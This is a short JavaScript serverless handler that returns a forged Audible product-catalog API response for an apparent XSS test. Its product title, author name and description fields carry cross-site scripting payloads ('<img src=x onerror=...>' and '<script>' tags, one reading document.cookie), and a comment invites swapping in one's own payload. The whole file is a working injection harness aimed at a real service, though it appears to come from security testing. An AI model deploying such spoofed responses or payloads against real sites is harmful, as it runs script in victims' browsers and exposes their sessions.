exports.handler = async (event) => {
  // This is the response from the debug panel, wrapped in Coral envelope
  // Replace the products array content with your XSS payload in relevant fields
  const response = {
    "Output": {
      "__type": "com.amazon.audibleapicatalogdata#GetProductsResponse",
      "products": [
        {
          "asin": "B0GXGLXFWR",
          "title": "<img src=x onerror=alert(document.domain)>",
          "subtitle": "XSS Test",
          "authors": [{"name": "<script>alert(1)</script>", "asin": "test"}],
          "narrators": [{"name": "Test Narrator"}],
          "description": "<img src=x onerror=alert(document.cookie)>",
          "publisher": "Test Publisher",
          "release_date": "2025-01-01",
          "language": "en-US",
          "runtime_length_min": 300,
          "format_type": "unabridged",
          "product_images": {}
        }
      ]
    },
    "Version": "1.0"
  };

  return {
    statusCode: 200,
    headers: {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": "*"
    },
    body: JSON.stringify(response)
  };
};
